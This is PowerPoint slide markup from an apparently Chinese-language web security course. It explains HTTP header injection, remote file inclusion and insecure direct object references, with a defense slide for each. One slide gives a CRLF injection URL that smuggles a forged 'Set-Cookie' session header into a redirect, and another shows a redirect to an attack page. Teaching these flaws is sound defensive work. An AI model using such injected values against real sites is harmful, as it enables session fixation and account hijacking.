            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Location: http://trap.com/web/attack.php</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="24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1055" y="1290926"/>
            <a:ext cx="8146472" cy="4680383"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>采用类似方法可以生成任意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>，看下面例子</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>消息头注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="463261" y="2107298"/>
            <a:ext cx="8472920" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="276225" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" kern="100" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>http://example.com/web/in.cfg?url=http://example.com/web/exampple.php%0D%0ASet-Cookie: + SESSID=ac13rkd90</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="100" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="707087" y="3216589"/>
            <a:ext cx="7633350" cy="1631216"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>执行之后，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>两个消息头：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400"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a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Set-Cookie: SESSID=ac13rkd90</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Location: http://example.com/web/exampple.php</a:t>
            </a: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11214" y="1318635"/>
            <a:ext cx="7750896" cy="4777365"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>不将外部传入参数作为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>响应消息头输出，如不直接使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>指定重定向目标，而是将其固定或通过编号等方式来指定，或使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用开发工具中提供的会话变量来转交</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>由专门的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>API</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>来进行重定向或生成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，并严格检验生成消息头的参数中的换行符</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>消息头注入防御</a:t>
            </a:r>
            <a:endParaRPr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88390" y="2932369"/>
            <a:ext cx="4908155" cy="586685"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>八、其它攻击</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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、恶意文件执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="417796"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a:t>    Code vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>remote file inclusion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> (RFI) allows attackers to include hostile code and data, resulting in devastating attacks, such as total server compromise.  Malicious file execution attacks affect PHP, XML and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>any framework which accepts filenames or files from users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="417797" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="515938" y="1301750"/>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7796">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4177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US" altLang="zh-CN" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、恶意文件执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="458755" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="617248" y="1397434"/>
            <a:ext cx="7989887" cy="4779962"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>恶意文件执行漏洞也称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>不安全的远程文件包含漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>需要用户提供输入文件名的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序容易受到攻击：如果对用户输入不验证，攻击者可借此操控</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序执行系统程序或外部</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>允许上传文件给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序带来的危害更大</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可以将可执行代码放置到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用中去；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可以替换</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件、日志文件或认证令牌</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8755">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="458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8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8755">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="458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8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8755">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="45875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87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58755">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="45875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87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58755">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="45875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5875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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、防御恶意文件执行漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="460803" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>禁止用户输入被用作输入文件片断；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>对于必须要用户输入文件名、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的地方，执行严格的检查验证输入合法性；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件上传的处理要非常小心：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件只允许上传到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>webroot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>目录以外的目录中，这样能防止文件被执行；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>限制或隔离</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>程序对文件的访问权限。</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0803">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="460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0803">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4608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0803">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4608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0803">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4608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08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0803">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4608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08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en-US" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>、不安全的直接对象引用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="418820"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a:t>    A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>direct object reference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> occurs when a developer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>exposes a reference to an internal implementation object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>, such as a file, directory, database record, or key, as a URL or form parameter. Attackers can manipulate those references to access other objects without authorization.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="418821" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="515938" y="133032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8820">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4188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ltLang="zh-CN" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、不安全的直接对象引用</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="461827" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="700377" y="1318636"/>
            <a:ext cx="7923212" cy="4532312"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不安全的直接对象引用漏洞也常称为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>目录遍历漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序常常会暴露内部对象，包括：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件或目录</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>数据库口令</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>数据库的一些对象名称，比如表名</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>访问控制</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
